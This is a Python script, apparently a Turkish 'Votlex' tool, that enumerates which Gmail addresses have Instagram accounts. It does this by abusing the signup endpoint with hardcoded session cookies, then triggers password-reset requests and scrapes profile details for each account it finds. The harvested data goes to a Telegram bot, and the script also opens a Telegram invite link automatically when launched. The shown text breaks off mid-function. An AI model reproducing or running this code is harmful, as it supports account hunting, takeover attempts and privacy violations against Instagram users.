import os
import sys
import time
import random
import requests
import datetime
import webbrowser
import pytz
import json
from faker import Faker
from secrets import token_hex
from user_agent import generate_user_agent
from random import choice, randrange
from threading import Thread
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import re
from random import choice as cc, randint as rr
from uuid import uuid4 as gg
try:
    import urllib.request
except ModuleNotFoundError:
    os.system("pip install urllib.request")

try:
    from rich.console import Console
except ModuleNotFoundError:
    os.system("pip install rich")
    os.system("clear")
#¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª‚òùÔ∏é‚òùÔ∏é‚òùÔ∏é{ùê©ùê¢ùê©}¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª¬ª#
basarli_ig = 0

hatali_ig = 0

basarli_gmail = 0

hatali_gmail = 0

votlexkk = 0

votlexbbb = 0

#¬ª¬ª¬ª¬ª¬ª¬ª¬ª{ùêùùêûùê†ùõäùê¨ùê§ùêûùêß}‚òùÔ∏é‚òùÔ∏é‚òùÔ∏é
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  
X = '\033[1;33m'  
Z1 = '\033[2;31m'  
F = '\033[2;32m'  
A = '\033[2;34m'  
C = '\033[2;35m'  
B = '\x1b[38;5;208m'  
Y = '\033[1;34m'  
M = '\x1b[1;37m'  
S = '\033[1;33m'
U = '\x1b[1;37m'  
R = '\x1b[1;34m'
a1 = '\x1b[1;31m'  
a2 = '\x1b[1;34m'  
a3 = '\x1b[1;32m'  
a4 = '\x1b[1;33m'  
a5 = '\x1b[38;5;208m'  
a6 = '\x1b[38;5;5m'  
E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m' 
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'
colors = [BR, AH2, AS2, MJ, MJ2, MJ3, MJ4, ma]
random_color = random.choice(colors)
webbrowser.open('https://t.me/+FGvUQ89vjzNlZmVk')

logo = f'\033[1;33m'"""
‚†Ä‚¢†‚°î‚†í‚†ã‚†õ‚†õ‚†ô‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†â‚†â‚†ã‚†ã‚†õ‚†í‚†≤‚£Ñ‚†Ä
‚¢∞‚°á‚†Ä‚†Ä‚†Ä‚£Ä‚£§‚£§‚£§‚£§‚£§‚£§‚£Ñ‚£§‚£§‚£§‚£§‚£§‚£§‚£Ñ‚£§‚£Ñ‚£§‚£†‚£Ñ‚£§‚£Ñ‚£§‚£Ñ‚£§‚£§‚£§‚£§‚£§‚£Ñ‚°Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°Ä
‚¢∏‚†Ö‚†Ä‚¢†‚£æ‚£ø‚°ø‚£ü‚£ø‚£ø‚†ø‚†ø‚†ø‚£ø‚£ø‚¢Ø‚£ü‚£Ø‚£ø‚£ª‚£ü‚£ø‚£ª‚¢ø‚£ª‚£ü‚£ø‚£ª‚£ø‚£ª‚£Ø‚£ø‚£Ω‚£ª‚¢ø‚£ø‚£ß‚°Ä‚†Ä‚¢∏‚†Ñ
‚¢∏‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£Ω‚£ø‚£ø‚†ø‚†ã‚†Ä‚†Ä‚£ø‚£ø‚£ª‚£Ø‚¢ø‚°∑‚£ø‚£Ω‚£Ø‚¢ø‚£ø‚°ø‚†ü‚†õ‚†â‚†â‚†â‚†â‚†â‚†ô‚†õ‚†ø‚£Ø‚£ø‚°á‚†Ä‚¢∏‚†Ä
‚¢∏‚†Ä‚†Ä‚¢∏‚£ø‚£Ω‚£æ‚£ø‚°è‚¢Ä‚°†‚£æ‚£æ‚£ø‚°∑‚£ø‚£Ω‚£ø‚£ª‚£Ω‚°æ‚†ü‚†â‚¢Å‚£†‚£§‚£∂‚£∂‚£æ‚£ø‚£ø‚£∑‚£∂‚£§‚°Ä‚†à‚†ª‚°á‚†Ä‚¢∏‚†Ä
‚†®‚†Ä‚†Ä‚¢∏‚£ø‚£Ω‚£ø‚†ª‚†ü‚†â‚†Ä‚£º‚£ø‚£Ø‚£ø‚£ü‚£æ‚£∑‚†ü‚†Å‚£Ä‚£§‚£æ‚£ø‚£ø‚£ª‚£Ω‚£Ø‚¢ø‚£ø‚¢∑‚°ø‚£æ‚£ü‚£ø‚£¶‚°Ä‚†Ä‚†Ä‚¢∏‚†Ä
‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ª‚°ü‚†Ä‚†Ä‚¢¥‚£ø‚£ø‚£ü‚£æ‚¢∑‚°ø‚†ã‚¢Ä‚£§‚£æ‚£ø‚¢ø‚£ª‚£Ω‚£æ‚£ü‚£∑‚£ø‚£ª‚£Ø‚°ø‚£ü‚£ø‚°æ‚£Ø‚£ø‚£∑‚°Ä‚†Ä‚¢∏‚†Ä
‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚¢ß‚£ø‚£ø‚†ü‚†Ä‚£†‚£ø‚£ø‚¢ø‚£º‚£ø‚¢ø‚£ª‚£º‚£ü‚£ø‚£º‚£ø‚£ß‚£ø‚°ø‚£ü‚£ø‚°ø‚£ß‚£ø‚£á‚†Ä‚¢∏‚†Ñ
‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚¢æ‚£ª‚£Ω‚£Ø‚¢ø‚£Ω‚£ø‚†ü‚†Å‚£†‚£æ‚£ø‚°ø‚£Ω‚£ø‚£ª‚£æ‚£ü‚£ø‚£Ω‚°æ‚£ü‚£æ‚¢ø‚£Ω‚°∑‚£ø‚£ª‚£Ø‚¢ø‚£ª‚£Ω‚£ø‚†Ä‚¢∏‚†Ä
‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚¢ø‚£ª‚£∑‚¢ø‚£ª‚°Ω‚†ã‚¢Ä‚£æ‚£ø‚£ü‚£∑‚°ø‚£ü‚£æ‚£ü‚£∑‚°ø‚£Ω‚£æ‚£ü‚°ø‚£Ø‚£ø‚¢Ø‚£ø‚£ª‚£Ω‚£ü‚£ø‚¢Ø‚£ü‚£ø‚†Ä‚¢∏‚†Ç
‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ª‚£Ø‚¢ø‚£ª‚†ü‚†Ä‚£¥‚£ø‚£ø‚£ª‚£æ‚¢Ø‚£ø‚¢ø‚£Ω‚£æ‚£Ø‚£ø‚£ø‚£æ‚£ü‚£ø‚£ø‚£Ω‚°ø‚£Ø‚£ø‚£Ω‚°æ‚£ü‚£ø‚¢Ø‚£ø‚†Ä‚¢∏‚†Ä
‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚¢Ø‚£ø‚£ø‚†è‚¢Ä‚£æ‚£ø‚£ü‚£æ‚¢ø‚£Ω‚£ü‚£Ø‚£ø‚£ø‚£∑‚£§‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£æ‚£ø‚°ø‚£Ø‚£∑‚¢ø‚£ª‚£ü‚£Ø‚£ø‚£ø‚†Ä‚¢∏‚†Ä
‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ª‚°Ω‚†É‚¢†‚£ø‚°ø‚£∑‚¢ø‚£Ø‚£ø‚£ª‚°æ‚£ü‚£ø‚£ø‚†ü‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†ê‚£ø‚£ø‚¢ø‚£Ω‚£Ø‚£ø‚¢ø‚£Ω‚¢ø‚£æ‚°á‚†Ä‚¢∏‚†Ä
‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚°ø‚†Å‚£∞‚£ø‚°ø‚£ü‚£ø‚£Ø‚¢ø‚£≥‚£ø‚£ø‚£ø‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ñ‚†Ä‚¢º‚£ø‚°ø‚£ü‚£ø‚¢æ‚£Ø‚£ø‚¢Ø‚£ø‚°ø‚†Å‚†Ä‚¢∏‚†Ä
‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚†Å‚¢†‚£ø‚£ü‚£ø‚£ª‚£Ω‚£æ‚¢ø‚£ª‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚£ø‚£ø‚£∑‚£Ω‚£ø‚£ø‚£ª‚£Ø‚°ø‚£∑‚£ª‚°ø‚£Ω‚†á‚†Ä‚†Ä‚¢∏‚†Ä
‚††‚†Ä‚†Ä‚¢∏‚†É‚¢†‚£ø‚£ø‚¢Ø‚£ø‚£Ω‚£∑‚¢ø‚£ø‚£ø‚£ø‚£ø‚£á‚†Ä‚£†‚†æ‚†ã‚†Ä‚¢π‚£ø‚£ø‚£ø‚¢ø‚£û‚£ø‚£≥‚£ø‚¢ø‚£Ω‚£ø‚°è‚¢Ä‚°á‚†Ä‚¢∏‚†Ä
‚†ê‚°Ä‚†Ä‚†û‚†Ä‚£æ‚£ø‚£Ø‚£ø‚£ª‚£æ‚£Ω‚£ø‚£ø‚°ø‚¢ø‚£ø‚£ø‚†û‚†â‚†Ä‚†Ñ‚†Ä‚¢∏‚£ø‚°ø‚£Ø‚£ø‚¢Ø‚£ü‚£ø‚°æ‚£ü‚£Ø‚°ü‚†Ä‚£æ‚°á‚†Ä‚¢∏‚†Ä
‚†∞‚†Ö‚†Ä‚†Ä‚£º‚£ø‚¢ø‚£û‚£∑‚£ø‚£≥‚£ø‚£æ‚£ø‚°á‚†Ä‚†õ‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£ø‚£ø‚£ü‚£ø‚£Ω‚°ø‚£Ø‚£∑‚°ø‚£ø‚°ü‚†Ä‚£º‚£ø‚°á‚†Ä‚¢∏‚†Ä
‚¢®‚†Å‚†Ä‚¢†‚£ø‚£ü‚£ø‚¢Ø‚£ø‚¢æ‚£ü‚£æ‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£¥‚£ø‚£ø‚£ü‚£∑‚°ø‚£Ω‚£æ‚£ü‚£ø‚£≥‚£ø‚†ü‚†Ä‚£º‚£ø‚£ø‚°á‚†Ä‚¢∏‚†Ä
‚¢∞‚†Ä‚†Ä‚¢∏‚£ø‚£ª‚£Ω‚°ø‚£Ø‚£ø‚¢Ø‚£ø‚£ø‚°ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚¢ø‚£ø‚°∑‚£ø‚¢Ø‚£ø‚£ü‚£∑‚°ø‚£Ω‚£ø‚†ã‚¢Ä‚£æ‚£ø‚¢ø‚£æ‚°á‚†Ä‚¢∏‚†Ä
‚¢∏‚†Ä‚†Ä‚£º‚£ø‚£ª‚£Ω‚°ø‚£Ø‚£ø‚£ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚£ü‚£ø‚£ª‚£∑‚£ü‚£Ø‚£ø‚°ø‚†É‚£†‚£ø‚£ø‚¢Ø‚£ø‚£ø‚°á‚†Ä‚¢∏‚†Ä
‚¢®‚†Ä‚†Ä‚£ø‚£ø‚¢Ø‚£∑‚°ø‚£ü‚£∑‚£ø‚£≥‚£ø‚¢Ø‚£ø‚£ª‚£ü‚£ø‚£ª‚°ø‚£Ω‚£ø‚£ª‚£Ω‚°ø‚£û‚£Ø‚£ø‚†ü‚¢Ä‚£¥‚£ø‚°ø‚£Ω‚£ø‚£≥‚£ø‚°á‚†Ä‚¢∏‚†Ä
‚¢ò‚†Ä‚†Ä‚¢π‚£ø‚£ü‚£Ø‚£ø‚¢ø‚£Ω‚£æ‚¢ø‚£Ω‚£ø‚£ª‚°∑‚£ø‚¢Ø‚£∑‚°ø‚£ü‚£æ‚£ü‚£∑‚°ø‚£ø‚†ü‚†Å‚£∞‚£ø‚°ø‚£Ø‚£ø‚£ü‚£æ‚£ü‚£ø‚°á‚†Ä‚¢∏‚†Ä
‚¢®‚°á‚†Ä‚†ò‚£ø‚£Ø‚£ø‚£Ω‚°ü‚£ø‚£æ‚°ü‚£ø‚°û‚£ø‚£Ω‚£ø‚¢ª‚£Ø‚£ø‚°ü‚£ø‚£æ‚£Ø‚°ü‚†Å‚¢†‚£æ‚£ø‚£ø‚£Ω‚£ø‚£æ‚£ø‚£∑‚£ø‚£ø‚°á‚†Ä‚¢∏‚†Ä
‚¢®‚°á‚†Ä‚†Ä‚¢ª‚£ø‚£Ω‚°ø‚£Ω‚°ø‚£û‚£ø‚£Ω‚¢ø‚£ª‚£Ω‚£æ‚£ü‚£ø‚¢æ‚£ü‚£ø‚†æ‚†ã‚¢Ä‚£¥‚£ø‚£ø‚£ª‚£æ‚£ø‚£ø‚†Ü‚†É‚¢Ä‚£ø‚£ø‚°á‚†Ä‚¢∏‚†Ä
‚¢†‚°á‚†Ä‚°Ü‚†Ä‚†π‚£ø‚£Ω‚£ü‚°ø‚£ø‚£Ω‚£æ‚¢ø‚£ª‚£Ω‚°æ‚£ü‚£æ‚†ø‚†ã‚†Å‚£†‚£æ‚£ø‚¢ø‚£ª‚£æ‚£ü‚£ø‚°è‚†Ä‚£Ä‚£¥‚£º‚£ø‚£ø‚°á‚†Ä‚¢∏‚†Ä
‚†∞‚°á‚†Ä‚£ø‚£¶‚°Ä‚†à‚†ô‚†ª‚¢ø‚£Ω‚£æ‚£Ø‚£ø‚†ø‚†∑‚†õ‚†â‚¢Ä‚£†‚£∂‚£ø‚£ø‚°ø‚£Ω‚°ø‚£Ø‚£∑‚£ø‚¢ø‚°∑‚†ä‚†Å‚£π‚£ø‚£ø‚£ø‚°á‚†Ä‚¢∏‚†Ä
‚¢∏‚†á‚†Ä‚¢ø‚£ø‚¢ø‚£∂‚£§‚£Ä‚£Ä‚°Ä‚†Ä‚£Ä‚£Ä‚£Ä‚£§‚£∂‚£æ‚£ø‚¢ø‚£ª‚£Ω‚°æ‚£ü‚£Ø‚£ø‚¢ø‚£Ω‚°è‚†à‚†Ä‚£†‚£æ‚£ø‚£ü‚£∑‚£ø‚°á‚†Ä‚¢∏‚†Ä
‚£∏‚°á‚†Ä‚†∏‚£ø‚£ø‚¢Ø‚£ü‚£ø‚°ø‚£ø‚£ø‚¢ø‚£ø‚¢ø‚£ü‚£Ø‚£ø‚°Ω‚£ø‚£ª‚£Ω‚£ü‚£ø‚£Ω‚¢Ø‚£ø‚¢ø‚£∑‚£∂‚£∂‚£æ‚£ø‚£ü‚£æ‚£Ø‚°ø‚†É‚†Ä‚¢∏‚°Ä
‚†ò‚°á‚†Ä‚†Ä‚†à‚†õ‚†ª‚†ª‚†õ‚†õ‚†ì‚†õ‚†õ‚†õ‚†õ‚†õ‚†õ‚†ö‚†õ‚†õ‚†õ‚†ì‚†õ‚†õ‚†ö‚†õ‚†õ‚†õ‚†õ‚†õ‚†õ‚†õ‚†ì‚†ü‚†õ‚†ã‚†Ä‚†Ä‚†Ä‚¢∏‚†Ä
‚†Ä‚†ô‚†¶‚£Ñ‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚†§‚†ö‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä

\x1b[38;5;208mTELEGRAM @Votlex1 :::: \x1b[38;5;193mCHANELL @Votlextool1

\x1b[38;5;26mTOOL :::  ƒ∞NSTA GMAƒ∞L 2011 - 2012 - 2013 #Comeback
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä"""



print(logo)

ID = input('\033[1;33m''ƒ∞D Gƒ∞R : ')
print('')
token = input('\x1b[38;5;193m''TOKEN Gƒ∞R : ')


anim = ["[api ile baƒülantƒ± kurulƒ±yor\x1b[1;91m‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]","[api ile baƒülantƒ± kurulƒ±yor\x1b[1;92m‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[api ile baƒülantƒ± kurulƒ±yor\x1b[1;93m‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[api ile baƒülantƒ± kurulƒ±yor\x1b[1;95m‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[api ile baƒülantƒ± kurulƒ±yor\x1b[1;94m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]", "[api ile baƒülantƒ± kurulƒ±yor\x1b[38;5;26m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°]", "[api ile baƒülantƒ± kurulƒ±yor\x1b[1;96m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°]", "[api ile baƒülantƒ± kurulƒ±yor\x1b[38;5;86m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°]", "[api ile baƒülantƒ± kurulƒ±yor\x1b[38;5;96m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°]", "[api ile baƒülantƒ± kurulƒ±yor\x1b[38;5;203m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m]"]
am = ('\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m')
for i in range(50):
        time.sleep(.1)
        os.system('clear')
        sys.stdout.write(f"\r {random_color} " + anim[i % len(anim)] +"\x1b[0m ")
        sys.stdout.write(f"\r {random_color}" + am[i % len(am)] +"\x1b[0m ")
        sys.stdout.flush()




def resetbro(email):
    global votlexbbb
    user = email.split('@')[0]
    baslik = {
      'User-Agent': str(generate_user_agent()),
      'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
      'x-ig-www-claim': "0",
      'x-web-session-id': "pdpuh3:hnl96m:7xxycv",
      'sec-ch-ua-platform-version': "\"\"",
      'x-requested-with': "XMLHttpRequest",
      'sec-ch-ua-full-version-list': "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
      'sec-ch-prefers-color-scheme': "dark",
      'x-csrftoken': "4cKwelJ3l4nSGw45VtrbO5VIe47xcPId",
      'sec-ch-ua-platform': "\"Linux\"",
      'x-ig-app-id': "936619743392459",
      'sec-ch-ua-model': "\"\"",
      'sec-ch-ua-mobile': "?0",
      'x-instagram-ajax': "1019237993",
      'x-asbd-id': "129477",
      'origin': "https://www.instagram.com",
      'sec-fetch-site': "same-origin",
      'sec-fetch-mode': "cors",
      'sec-fetch-dest': "empty",
      'referer': "https://www.instagram.com/accounts/password/reset/?hl=tr",
      'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
      'Cookie': "ig_did=2D779848-745D-4150-A945-498328A2E425; datr=uQVoZ6T8vjGRDwoZk8p5Q0nz; mid=Z2gFuQABAAHN6QellqWfQ6hZS5j8; ig_nrcb=1; ps_l=1; ps_n=1; csrftoken=4cKwelJ3l4nSGw45VtrbO5VIe47xcPId; dpr=3.0234789848327637; wd=891x982"}

    istek = {
      'email_or_username': f"{user}"}
    try:
        response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', data=istek, headers=baslik)
        rest = response.json()['contact_point']
    except:
        rest = 'RESET YOK BRO'
    try:
        baslik1 = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    f'referer': 'https://www.instagram.com/{user}/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'x-asbd-id': '129477',
    'x-csrftoken': 'imA67qsBLyN96eLTamoh4kaZBqaoq9Hq',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': 'hmac.AR0Gqm5ikC8qQcyoxd92BHLLfoC4rZTEkJA-MT5F6Qy5CAU3',
    'x-requested-with': 'XMLHttpRequest',}

        params = {
    'username': f'{user}',}

        re = requests.get(
    'https://www.instagram.com/api/v1/users/web_profile_info/',
    params=params,
    headers=baslik1,).json()
    
        kullanci = re['data']['user']['username']
        bio = re['data']['user']['biography']
        takip√ßi = re['data']['user']['edge_followed_by']['count']
        takip = re['data']['user']['edge_follow']['count']
        ad = re['data']['user']['full_name']
        id = re['data']['user']['id']
        katagori = re['data']['user']['category_name']
        gizlilik = re['data']['user']['is_private']
        tik = re['data']['user']['is_verified']
        post = re['data']['user']['edge_owner_to_timeline_media']['count']
        try:
            if id == None:tarih=None
            else:
                    tarih = requests.get(f'https://gojoapi.pythonanywhere.com/get-year',params={'Id':{id}}).json().get('year','TARƒ∞H YOK')
        except:tarih=None
        votlexbbb += 1
        tlg = f'''
¬´¬´¬´¬´¬´¬´¬´‚òæÔ∏éùêïùêéùêìùêãùêÑùêó‚òΩÔ∏é¬ª¬ª¬ª¬ª¬ª¬ª¬ª
    [üÇ±] ùêáùêàùêì ‚û™ {votlexbbb}
    [üÇ±] ùêÄùêÉùêà ‚û™ {ad}
    [üÇ±] ùêä.ùêÄùêÉ ‚û™  {kullanci}
    [üÇ±] ùêÑùêåùêÄùêàùêã ‚û™ {kullanci}@gmail.com
    [üÇ±] ùêìùêÄùêäùêàùêèùêÇÃßùêà ‚û™ {takip√ßi}
    [üÇ±] ùêìùêÄùêäùêàùêè ‚û™  {takip}
    [üÇ±] ùêàùêÉ'ùêíùêà ‚û™  {id}
    [üÇ±] ùêèùêéùêíùêì ùêíùêÄùêòùêàùêíùêà ‚û™  {post}
    [üÇ±] ùêÅùêàùêé'ùêíùêî ‚û™ {bio}
    [üÇ±] ùêåùêÄùêïùêà ùêìùêàùêä ? ‚û™ {"evet" if tik else "hayƒ±r"}
    [üÇ±] ùêáùêÑùêíùêÄùêè ùêÜùêàùêôùêãùêàùêåùêà ? ‚û™ {"Evet" if gizlilik else "Hayƒ±r"}
    [üÇ±] ùêäùêÄùêìùêÄùêÜùêéùêëùêà ‚û™ {katagori if katagori else "Yok"}
    [üÇ±] ùêìùêÄùêëùêàùêá ‚û™ {tarih}
    [üÇ±] ùêëùêÑùêíùêÑùêì ‚û™ {rest}
¬´¬´¬´¬´¬´¬´¬´‚òæÔ∏éùêïùêéùêìùêãùêÑùêó‚òΩÔ∏é¬ª¬ª¬ª¬ª¬ª¬ª¬ª
    ùêÉùêÑùêïùêÑùêãùêéùêèùêÑùêë : @Votlex1 @Votlextool1 '''
        print(tlg)
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(tlg))
        
    except:
        tlg = f'''
¬´¬´¬´¬´¬´¬´¬´‚òæÔ∏éùêïùêéùêìùêãùêÑùêó‚òΩÔ∏é¬ª¬ª¬ª¬ª¬ª¬ª¬ª
    ùêàùêçùêÖùêéùêíùêîùêô ùêáùêàùêì
    [üÇ±] ùêäùêîùêãùêãùêÄùêçùêÇùêà ùêÄùêÉùêà ‚û™ {user}
    [üÇ±] ùêÑùêåùêÄùêàùêã ‚û™ {user}@gmail.com
¬´¬´¬´¬´¬´¬´¬´‚òæÔ∏éùêïùêéùêìùêãùêÑùêó‚òΩÔ∏é¬ª¬ª¬ª¬ª¬ª¬ª¬ª
    ùêÉùêÑùêïùêÑùêãùêéùêèùêÑùêë : @Votlex1 @Votlextool '''
        print(tlg)
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(tlg))
        
def votlex_insta(email):
    global basarli_ig, hatali_ig
    email = email + '@gmail.com'
    url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
    
    payload = {
      'enc_password': "#PWD_INSTAGRAM_BROWSER:10:1736421502:AVVQAByDjqCz661dAt7I4WaXWojhfRVQefbzbP0wMiHQI54K8I2DOM1EiagPkyf1TyS9G2SgZvY+eQoO8JgigfGeakRsHJpRMyuUKEb9Y2nnQnQfqzoPmQ5DWyOgmAikF+vLIr8zueygeBE=",
      'email': email,
      'failed_birthday_year_count': "{}",
      'first_name': "Bababebh",
      'username': "yoklelelley",
      'opt_into_one_tap': "false",
      'use_new_suggested_user_name': "true"
    }
    
    headers = {
      'User-Agent': str(generate_user_agent()),
      'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
      'x-ig-www-claim': "0",
      'x-web-session-id': "f1gmpo:6kvyjw:7iwyyc",
      'sec-ch-ua-platform-version': "\"\"",
      'x-requested-with': "XMLHttpRequest",
      'sec-ch-ua-full-version-list': "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
      'sec-ch-prefers-color-scheme': "dark",
      'x-csrftoken': "4cKwelJ3l4nSGw45VtrbO5VIe47xcPId",
      'sec-ch-ua-platform': "\"Linux\"",
      'x-ig-app-id': "936619743392459",
      'sec-ch-ua-model': "\"\"",
      'sec-ch-ua-mobile': "?0",
      'x-instagram-ajax': "1019227817",
      'x-asbd-id': "129477",
      'origin': "https://www.instagram.com",
      'sec-fetch-site': "same-origin",
      'sec-fetch-mode': "cors",
      'sec-fetch-dest': "empty",
      'referer': "https://www.instagram.com/accounts/emailsignup/",
      'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
      'Cookie': "ig_did=2D779848-745D-4150-A945-498328A2E425; datr=uQVoZ6T8vjGRDwoZk8p5Q0nz; mid=Z2gFuQABAAHN6QellqWfQ6hZS5j8; ig_nrcb=1; ps_l=1; ps_n=1; dpr=3.0234789848327637; csrftoken=4cKwelJ3l4nSGw45VtrbO5VIe47xcPId; wd=891x1669"
    }
    
    vtl = requests.post(url, data=payload, headers=headers).text
    if "email_is_taken" in vtl:
        resetbro(email)
        basarli_ig += 1
        os.system('clear')
        print(f''' 
        ùêÉùêÑùêïùêÑùêãùêéùêèùêÑùêë ¬´¬´¬´¬´ (ùêïùêéùêìùêãùêÑùêó) ¬ª¬ª¬ª¬ª
             ___________________________________
        (1) : {F}BA≈ûARLI ƒ∞G  (Hƒ∞T) {B}{basarli_ig}
        (2) : {E}HATALI ƒ∞G {a6}{hatali_ig}
        (3) : {a2}BA≈ûARLI GMAƒ∞L {a2}{basarli_gmail}
        (4) : {E}HATALI GMAƒ∞L {a5}{hatali_gmail}
        (9) : {X}CHECKLENEN EMAƒ∞L {email} ''')
    else:
        hatali_ig += 1
        os.system('clear')
        print(f''' 
        ¬´¬´¬´¬´ (ùêÉùêÑùêïùêÑùêãùêéùêèùêÑùêë) ¬ª¬ª¬ª¬ª
             ___________________________________
        (1) : {F}BA≈ûARLI ƒ∞G  (Hƒ∞T) {B}{basarli_ig}
        (2) : {E}HATALI ƒ∞G {a6}{hatali_ig}
        (3) : {a2}BA≈ûARLI GMAƒ∞L {a2}{basarli_gmail}
        (4) : {E}HATALI GMAƒ∞L {a5}{hatali_gmail}
        (9) : {X}CHECKLENEN EMAƒ∞L {email} ''')
        
    




def votlex_gmail(email):
    global hatali_gmail, basarli_gmail
    try:
        n1=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(6,9)))
        n2=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(3,9)))
        host=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn')for _ in range(rr(15,30)))
        headers_init={"accept":"*/*","accept-language":"ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6","content-type":"application/x-www-form-urlencoded;charset=UTF-8","google-accounts-xsrf":"1","sec-ch-ua":"\"Not)A;Brand\";v=\"24\",\"Chromium\";v=\"116\"","sec-ch-ua-mobile":"?1","sec-ch-ua-platform":"\"Android\"","user-agent":str(gg())}
